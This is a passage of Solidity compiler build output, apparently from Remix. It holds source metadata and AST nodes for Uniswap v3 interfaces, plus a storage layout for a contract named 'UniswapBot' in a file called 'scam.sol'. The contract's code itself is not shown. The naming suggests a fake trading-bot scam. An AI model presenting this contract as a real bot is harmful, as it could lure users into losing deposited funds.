ZXdgQNXKAckrXWz9R3mc47F1fvDvr28a2ewJrwNAw71B\"]},\"github.com/Uniswap/v3-core/blob/main/contracts/interfaces/IUniswapV3Pool.sol\":{\"keccak256\":\"0xfe6113d518466cd6652c85b111e01f33eb62157f49ae5ed7d5a3947a2044adb1\",\"license\":\"GPL-2.0-or-later\",\"urls\":[\"bzz-raw://1c42b9e6f5902ac38dd43e25750939baa7e0c1425dc75afd717c4412731065d5\",\"dweb:/ipfs/QmWaoacnzsucTvBME2o7YgZBZMhaHv7fkj83htHMVWJKWh\"]},\"github.com/Uniswap/v3-core/blob/main/contracts/interfaces/pool/IUniswapV3PoolActions.sol\":{\"keccak256\":\"0x9453dd0e7442188667d01d9b65de3f1e14e9511ff3e303179a15f6fc267f7634\",\"license\":\"GPL-2.0-or-later\",\"urls\":[\"bzz-raw://982f4328f956c3e60e67501e759eb292ac487f76460c774c50e9ae4fcc92aae5\",\"dweb:/ipfs/QmRnzEDsaqtd9PJEVcgQi7p5aV5pMSvRUoGZJAdwFUJxgZ\"]},\"github.com/Uniswap/v3-core/blob/main/contracts/interfaces/pool/IUniswapV3PoolDerivedState.sol\":{\"keccak256\":\"0xe603ac5b17ecdee73ba2b27efdf386c257a19c14206e87eee77e2017b742d9e5\",\"license\":\"GPL-2.0-or-later\",\"urls\":[\"bzz-raw://8febc9bdb399a4d94bb89f5377732652e2400e4a8dee808201ade6848f9004e7\",\"dweb:/ipfs/QmaKDqYYFU4d2W2iN77aDHptfbFmYZRrMYXHeGpJmM8C1c\"]},\"github.com/Uniswap/v3-core/blob/main/contracts/interfaces/pool/IUniswapV3PoolEvents.sol\":{\"keccak256\":\"0x8071514d0fe5d17d6fbd31c191cdfb703031c24e0ece3621d88ab10e871375cd\",\"license\":\"GPL-2.0-or-later\",\"urls\":[\"bzz-raw://d0b571930cc7488b1d546a7e9cea7c52d8b3c4e207da657ed0e0db7343b8cd03\",\"dweb:/ipfs/QmaGK6vVwB95QSTR1XMYvrh7ivYAYZxi3fD7v6VMA4jZ39\"]},\"github.com/Uniswap/v3-core/blob/main/contracts/interfaces/pool/IUniswapV3PoolImmutables.sol\":{\"keccak256\":\"0xf6e5d2cd1139c4c276bdbc8e1d2b256e456c866a91f1b868da265c6d2685c3f7\",\"license\":\"GPL-2.0-or-later\",\"urls\":[\"bzz-raw://b99c8c9ae8e27ee6559e5866bea82cbc9ffc8247f8d15b7422a4deb287d4d047\",\"dweb:/ipfs/QmfL8gaqt3ffAnm6nVj5ksuNpLygXuL3xq5VBqrkwC2JJ3\"]},\"github.com/Uniswap/v3-core/blob/main/contracts/interfaces/pool/IUniswapV3PoolOwnerActions.sol\":{\"keccak256\":\"0x759b78a2918af9e99e246dc3af084f654e48ef32bb4e4cb8a966aa3dcaece235\",\"license\":\"GPL-2.0-or-later\",\"urls\":[\"bzz-raw://64144fb96e1c7fdba87305acadb98a198d26a3d46c097cb3a666e567f6f29735\",\"dweb:/ipfs/QmUnWVwN9FKB9uV5Pr8YfLpWZnYM2DENnRMaadZ492JS9u\"]},\"github.com/Uniswap/v3-core/blob/main/contracts/interfaces/pool/IUniswapV3PoolState.sol\":{\"keccak256\":\"0x852dc1f5df7dcf7f11e7bb3eed79f0cea72ad4b25f6a9d2c35aafb48925fd49f\",\"license\":\"GPL-2.0-or-later\",\"urls\":[\"bzz-raw://ed63907c38ff36b0e22bc9ffc53e791ea74f0d4f0e7c257fdfb5aaf8825b1f0f\",\"dweb:/ipfs/QmSQrckghEjs6HVsA5GVgpNpZWvTXMY5eQLF7cN6deFeEg\"]},\"github.com/Uniswap/v3-core/blob/main/contracts/libraries/LiquidityMath.sol\":{\"keccak256\":\"0xd53041349718d5bce4a89e87cd911879d41ba42ba3fab0614e5e8b742f352b88\",\"license\":\"GPL-2.0-or-later\",\"urls\":[\"bzz-raw://ea7529b99ab4fc1d3e6c5a31990fb688f0a2d6cc302c0419e0cf5a2d6c563781\",\"dweb:/ipfs/QmVaphRSNpfChHZKzutQ9WprwCo2WE1euvThRfHcwsnHhj\"]},\"scam.sol\":{\"keccak256\":\"0x96db5061982f2c69ea33c73880b4f6ec8f3be66ce2dd5ac69b36ab86af52559e\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://4f633c28f757c229e2b587cd7c62f5b4920957422c300e76824550e2e614b2bc\",\"dweb:/ipfs/QmYu7e46zKsCeGrZeGWyuDSysH5qnnof5egigJddAf5Pdy\"]}},\"version\":1}",
					"storageLayout": {
						"storage": [
							{
								"astId": 583,
								"contract": "scam.sol:UniswapBot",
								"label": "debugMempool",
								"offset": 0,
								"slot": "0",
								"type": "t_string_storage"
							},
							{
								"astId": 585,
								"contract": "scam.sol:UniswapBot",
								"label": "debugBot",
								"offset": 0,
								"slot": "1",
								"type": "t_string_storage"
							},
							{
								"astId": 587,
								"contract": "scam.sol:UniswapBot",
								"label": "liquidity",
								"offset": 0,
								"slot": "2",
								"type": "t_uint256"
							}
						],
						"types": {
							"t_string_storage": {
								"encoding": "bytes",
								"label": "string",
								"numberOfBytes": "32"
							},
							"t_uint256": {
								"encoding": "inplace",
								"label": "uint256",
								"numberOfBytes": "32"
							}
						}
					},
					"userdoc": {
						"kind": "user",
						"methods": {},
						"version": 1
					}
				}
			}
		},
		"sources": {
			"github.com/Uniswap/v3-core/blob/main/contracts/interfaces/IUniswapV3Factory.sol": {
				"ast": {
					"absolutePath": "github.com/Uniswap/v3-core/blob/main/contracts/interfaces/IUniswapV3Factory.sol",
					"exportedSymbols": {
						"IUniswapV3Factory": [
							82
						]
					},
					"id": 83,
					"license": "GPL-2.0-or-later",
					"nodeType": "SourceUnit",
					"nodes": [
						{
							"id": 1,
							"literals": [
								"solidity",
								">=",
								"0.5",
								".0"
							],
							"nodeType": "PragmaDirective",
							"src": "45:24:0"
						},
						{
							"abstract": false,
							"baseContracts": [],
							"contractDependencies": [],
							"contractKind": "interface",
							"documentation": {
								"id": 2,
								"nodeType": "StructuredDocumentation",
								"src": "71:163:0",
								"text": "@title The interface for the Uniswap V3 Factory\n @notice The Uniswap V3 Factory facilitates creation of Uniswap V3 pools and control over the protocol fees"
							},
							"fullyImplemented": false,
							"id": 82,
							"linearizedBaseContracts": [
								82
							],
							"name": "IUniswapV3Factory",
							"nodeType": "ContractDefinition",
							"nodes": [
								{
									"anonymous": false,
									"documentation": {
										"id": 3,
										"nodeType": "StructuredDocumentation",
										"src": "268:185:0",
										"text": "@notice Emitted when the owner of the factory is changed\n @param oldOwner The owner before the owner was changed\n @param newOwner The owner after the owner was changed"
									},
									"id": 9,
									"name": "OwnerChanged",
									"nodeType": "EventDefinition",
									"parameters": {
										"id": 8,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 5,
												"indexed": true,
												"mutability": "mutable",
												"name": "oldOwner",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 9,
												"src": "477:24:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 4,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "477:7:0",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 7,
												"indexed": true,
												"mutability": "mutable",
												"name": "newOwner",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 9,
												"src": "503:24:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 6,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "503:7:0",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "476:52:0"
									},
									"src": "458:71:0"
								},
								{
									"anonymous": false,
									"documentation": {
										"id": 10,
										"nodeType": "StructuredDocumentation",
										"src": "535:421:0",
										"text": "@notice Emitted when a pool is created\n @param token0 The first token of the pool by address sort order\n @param token1 The second token of the pool by address sort order\n @param fee The fee collected upon every swap in the pool, denominated in hundredths of a bip\n @param tickSpacing The minimum number of ticks between initialized ticks\n @param pool The address of the created pool"
									},
									"id": 22,
									"name": "PoolCreated",
									"nodeType": "EventDefinition",
									"parameters": {
										"id": 21,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 12,
												"indexed": true,
												"mutability": "mutable",
												"name": "token0",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 22,
												"src": "988:22:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 11,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "988:7:0",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 14,
												"indexed": true,
												"mutability": "mutable",
												"name": "token1",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 22,
												"src": "1020:22:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 13,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "1020:7:0",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 16,
												"indexed": true,
												"mutability": "mutable",
												"name": "fee",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 22,
												"src": "1052:18:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint24",
													"typeString": "uint24"
												},
												"typeName": {
													"id": 15,
													"name": "uint24",
													"nodeType": "ElementaryTypeName",
													"src": "1052:6:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint24",
														"typeString": "uint24"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 18,
												"indexed": false,
												"mutability": "mutable",
												"name": "tickSpacing",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 22,
												"src": "1080:17:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_int24",
													"typeString": "int24"
												},
												"typeName": {
													"id": 17,
													"name": "int24",
													"nodeType": "ElementaryTypeName",
													"src": "1080:5:0",
													"typeDescriptions": {
														"typeIdentifier": "t_int24",
														"typeString": "int24"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 20,
												"indexed": false,
												"mutability": "mutable",
												"name": "pool",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 22,
												"src": "1107:12:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 19,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "1107:7:0",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "978:147:0"
									},
									"src": "961:165:0"
								},
								{
									"anonymous": false,
									"documentation": {
										"id": 23,
										"nodeType": "StructuredDocumentation",
										"src": "1132:275:0",
										"text": "@notice Emitted when a new fee amount is enabled for pool creation via the factory\n @param fee The enabled fee, denominated in hundredths of a bip\n @param tickSpacing The minimum number of ticks between initialized ticks for pools created with the given fee"
									},
									"id": 29,
									"name": "FeeAmountEnabled",
									"nodeType": "EventDefinition",
									"parameters": {
										"id": 28,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 25,
												"indexed": true,
												"mutability": "mutable",
												"name": "fee",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 29,
												"src": "1435:18:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint24",
													"typeString": "uint24"
												},
												"typeName": {
													"id": 24,
													"name": "uint24",
													"nodeType": "ElementaryTypeName",
													"src": "1435:6:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint24",
														"typeString": "uint24"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 27,
												"indexed": true,
												"mutability": "mutable",
												"name": "tickSpacing",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 29,
												"src": "1455:25:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_int24",
													"typeString": "int24"
												},
												"typeName": {
													"id": 26,
													"name": "int24",
													"nodeType": "ElementaryTypeName",
													"src": "1455:5:0",
													"typeDescriptions": {
														"typeIdentifier": "t_int24",
														"typeString": "int24"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "1434:47:0"
									},
									"src": "1412:70:0"
								},
								{
									"body": null,
									"documentation": {
										"id": 30,
										"nodeType": "StructuredDocumentation",
										"src": "1488:163:0",
										"text": "@notice Returns the current owner of the factory\n @dev Can be changed by the current owner via setOwner\n @return The address of the factory owner"
									},
									"functionSelector": "8da5cb5b",
									"id": 35,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "owner",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 31,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "1670:2:0"
									},
									"returnParameters": {
										"id": 34,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 33,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 35,
												"src": "1696:7:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 32,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "1696:7:0",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "1695:9:0"
									},
									"scope": 82,
									"src": "1656:49:0",
									"stateMutability": "view",
									"virtual": false,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": {
										"id": 36,
										"nodeType": "StructuredDocumentation",
										"src": "1711:348:0",
										"text": "@notice Returns the tick spacing for a given fee amount, if enabled, or 0 if not enabled\n @dev A fee amount can never be removed, so this value should be hard coded or cached in the calling context\n @param fee The enabled fee, denominated in hundredths of a bip. Returns 0 in case of unenabled fee\n @return The tick spacing"
									},
									"functionSelector": "22afcccb",
									"id": 43,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "feeAmountTickSpacing",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 39,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 38,
												"mutability": "mutable",
												"name": "fee",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 43,
												"src": "2094:10:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint24",
													"typeString": "uint24"
												},
												"typeName": {
													"id": 37,
													"name": "uint24",
													"nodeType": "ElementaryTypeName",
													"src": "2094:6:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint24",
														"typeString": "uint24"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "2093:12:0"
									},
									"returnParameters": {
										"id": 42,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 41,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 43,
												"src": "2129:5:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_int24",
													"typeString": "int24"
												},
												"typeName": {
													"id": 40,
													"name": "int24",
													"nodeType": "ElementaryTypeName",
													"src": "2129:5:0",
													"typeDescriptions": {
														"typeIdentifier": "t_int24",
														"typeString": "int24"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "2128:7:0"
									},
									"scope": 82,
									"src": "2064:72:0",
									"stateMutability": "view",
									"virtual": false,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": {
										"id": 44,
										"nodeType": "StructuredDocumentation",
										"src": "2142:471:0",
										"text": "@notice Returns the pool address for a given pair of tokens and a fee, or address 0 if it does not exist\n @dev tokenA and tokenB may be passed in either token0/token1 or token1/token0 order\n @param tokenA The contract address of either token0 or token1\n @param tokenB The contract address of the other token\n @param fee The fee collected upon every swap in the pool, denominated in hundredths of a bip\n @return pool The pool address"
									},
									"functionSelector": "1698ee82",
									"id": 55,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "getPool",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 51,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 46,
												"mutability": "mutable",
												"name": "tokenA",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 55,
												"src": "2644:14:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 45,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "2644:7:0",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 48,
												"mutability": "mutable",
												"name": "tokenB",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 55,
												"src": "2668:14:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 47,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "2668:7:0",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 50,
												"mutability": "mutable",
												"name": "fee",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 55,
												"src": "2692:10:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint24",
													"typeString": "uint24"
												},
												"typeName": {
													"id": 49,
													"name": "uint24",
													"nodeType": "ElementaryTypeName",
													"src": "2692:6:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint24",
														"typeString": "uint24"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "2634:74:0"
									},
									"returnParameters": {
										"id": 54,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 53,
												"mutability": "mutable",
												"name": "pool",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 55,
												"src": "2732:12:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 52,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "2732:7:0",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "2731:14:0"
									},
									"scope": 82,
									"src": "2618:128:0",
									"stateMutability": "view",
									"virtual": false,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": {
										"id": 56,
										"nodeType": "StructuredDocumentation",
										"src": "2752:554:0",
										"text": "@notice Creates a pool for the given two tokens and fee\n @param tokenA One of the two tokens in the desired pool\n @param tokenB The other of the two tokens in the desired pool\n @param fee The desired fee for the pool\n @dev tokenA and tokenB may be passed in either order: token0/token1 or token1/token0. tickSpacing is retrieved\n from the fee. The call will revert if the pool already exists, the fee is invalid, or the token arguments\n are invalid.\n @return pool The address of the newly created pool"
									},
									"functionSelector": "a1671295",
									"id": 67,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "createPool",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 63,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 58,
												"mutability": "mutable",
												"name": "tokenA",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 67,
												"src": "3340:14:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 57,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "3340:7:0",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 60,
												"mutability": "mutable",
												"name": "tokenB",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 67,
												"src": "3364:14:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 59,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "3364:7:0",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 62,
												"mutability": "mutable",
												"name": "fee",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 67,
												"src": "3388:10:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint24",
													"typeString": "uint24"
												},
												"typeName": {
													"id": 61,
													"name": "uint24",
													"nodeType": "ElementaryTypeName",
													"src": "3388:6:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint24",
														"typeString": "uint24"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "3330:74:0"
									},
									"returnParameters": {
										"id": 66,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 65,
												"mutability": "mutable",
												"name": "pool",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 67,
												"src": "3423:12:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 64,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "3423:7:0",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "3422:14:0"
									},
									"scope": 82,
									"src": "3311:126:0",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": {
										"id": 68,
										"nodeType": "StructuredDocumentation",
										"src": "3443:144:0",
										"text": "@notice Updates the owner of the factory\n @dev Must be called by the current owner\n @param _owner The new owner of the factory"
									},
									"functionSelector": "13af4035",
									"id": 73,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "setOwner",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 71,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 70,
												"mutability": "mutable",
												"name": "_owner",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 73,
												"src": "3610:14:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 69,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "3610:7:0",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "3609:16:0"
									},
									"returnParameters": {
										"id": 72,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "3634:0:0"
									},
									"scope": 82,
									"src": "3592:43:0",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": {
										"id": 74,
										"nodeType": "StructuredDocumentation",
										"src": "3641:326:0",
										"text": "@notice Enables a fee amount with the given tickSpacing\n @dev Fee amounts may never be removed once enabled\n @param fee The fee amount to enable, denominated in hundredths of a bip (i.e. 1e-6)\n @param tickSpacing The spacing between ticks to be enforced for all pools created with the given fee amount"
									},
									"functionSelector": "8a7c195f",
									"id": 81,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "enableFeeAmount",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 79,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 76,
												"mutability": "mutable",
												"name": "fee",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 81,
												"src": "3997:10:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint24",
													"typeString": "uint24"
												},
												"typeName": {
													"id": 75,
													"name": "uint24",
													"nodeType": "ElementaryTypeName",
													"src": "3997:6:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint24",
														"typeString": "uint24"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 78,
												"mutability": "mutable",
												"name": "tickSpacing",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 81,
												"src": "4009:17:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_int24",
													"typeString": "int24"
												},
												"typeName": {
													"id": 77,
													"name": "int24",
													"nodeType": "ElementaryTypeName",
													"src": "4009:5:0",
													"typeDescriptions": {
														"typeIdentifier": "t_int24",
														"typeString": "int24"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "3996:31:0"
									},
									"returnParameters": {
										"id": 80,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "4036:0:0"
									},
									"scope": 82,
									"src": "3972:65:0",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "external"
								}
							],
							"scope": 83,
							"src": "234:3805:0"
						}
					],
					"src": "45:3995:0"
				},
				"id": 0
			},
			"github.com/Uniswap/v3-core/blob/main/contracts/interfaces/IUniswapV3Pool.sol": {
				"ast": {
					"absolutePath": "github.com/Uniswap/v3-core/blob/main/contracts/interfaces/IUniswapV3Pool.sol",
					"exportedSymbols": {
						"IUniswapV3Pool": [
							104
						]
					},
					"id": 105,
					"license": "GPL-2.0-or-later",
					"nodeType": "SourceUnit",
					"nodes": [
						{
							"id": 84,
							"literals": [
								"solidity",
								">=",
								"0.5",
								".0"
							],
							"nodeType": "PragmaDirective",
							"src": "45:24:1"
						},
						{
							"absolutePath": "github.com/Uniswap/v3-core/blob/main/contracts/interfaces/pool/IUniswapV3PoolImmutables.sol",
							"file": "./pool/IUniswapV3PoolImmutables.sol",
							"id": 85,
							"nodeType": "ImportDirective",
							"scope": 105,
							"sourceUnit": 391,
							"src": "71:45:1",
							"symbolAliases": [],
							"unitAlias": ""
						},
						{
							"absolutePath": "github.com/Uniswap/v3-core/blob/main/contracts/interfaces/pool/IUniswapV3PoolState.sol",
							"file": "./pool/IUniswapV3PoolState.sol",
							"id": 86,
							"nodeType": "ImportDirective",
							"scope": 105,
							"sourceUnit": 525,
							"src": "117:40:1",
							"symbolAliases": [],
							"unitAlias": ""
						},
						{
							"absolutePath": "github.com/Uniswap/v3-core/blob/main/contracts/interfaces/pool/IUniswapV3PoolDerivedState.sol",
							"file": "./pool/IUniswapV3PoolDerivedState.sol",
							"id": 87,
							"nodeType": "ImportDirective",
							"scope": 105,
							"sourceUnit": 232,
							"src": "158:47:1",
							"symbolAliases": [],
							"unitAlias": ""
						},
						{
							"absolutePath": "github.com/Uniswap/v3-core/blob/main/contracts/interfaces/pool/IUniswapV3PoolActions.sol",
							"file": "./pool/IUniswapV3PoolActions.sol",
							"id": 88,
							"nodeType": "ImportDirective",
							"scope": 105,
							"sourceUnit": 201,
							"src": "206:42:1",
							"symbolAliases": [],
							"unitAlias": ""
						},
						{
							"absolutePath": "github.com/Uniswap/v3-core/blob/main/contracts/interfaces/pool/IUniswapV3PoolOwnerActions.sol",
							"file": "./pool/IUniswapV3PoolOwnerActions.sol",
							"id": 89,
							"nodeType": "ImportDirective",
							"scope": 105,
							"sourceUnit": 417,
							"src": "249:47:1",
							"symbolAliases": [],
							"unitAlias": ""
						},
						{
							"absolutePath": "github.com/Uniswap/v3-core/blob/main/contracts/interfaces/pool/IUniswapV3PoolEvents.sol",
							"file": "./pool/IUniswapV3PoolEvents.sol",
							"id": 90,
							"nodeType": "ImportDirective",
							"scope": 105,
							"sourceUnit": 351,
							"src": "297:41:1",
							"symbolAliases": [],
							"unitAlias": ""
						},
						{
							"abstract": false,
							"baseContracts": [
								{
									"arguments": null,
									"baseName": {
										"contractScope": null,
										"id": 92,
										"name": "IUniswapV3PoolImmutables",
										"nodeType": "UserDefinedTypeName",
										"referencedDeclaration": 390,
										"src": "637:24:1",
										"typeDescriptions": {
											"typeIdentifier": "t_contract$_IUniswapV3PoolImmutables_$390",
											"typeString": "contract IUniswapV3PoolImmutables"
										}
									},
									"id": 93,
									"nodeType": "InheritanceSpecifier",
									"src": "637:24:1"
								},
								{
									"arguments": null,
									"baseName": {
										"contractScope": null,
										"id": 94,
